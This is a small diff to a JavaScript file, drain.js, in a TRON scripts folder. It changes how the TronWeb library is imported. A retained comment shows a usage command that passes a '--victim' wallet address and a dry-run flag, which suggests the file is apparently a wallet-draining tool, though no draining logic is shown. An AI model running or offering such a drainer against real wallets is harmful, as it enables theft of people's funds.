@@ -14,7 +14,7 @@
 //   # 预览模式（不实际发送交易）
 //   node scripts/tron/drain.js --victim Txxx --dry-run
 
-const TronWeb = require("tronweb");
+const { TronWeb } = require("tronweb");
 const path = require("path");
 require("dotenv").config({ path: path.resolve(__dirname, "../../.env") });
 
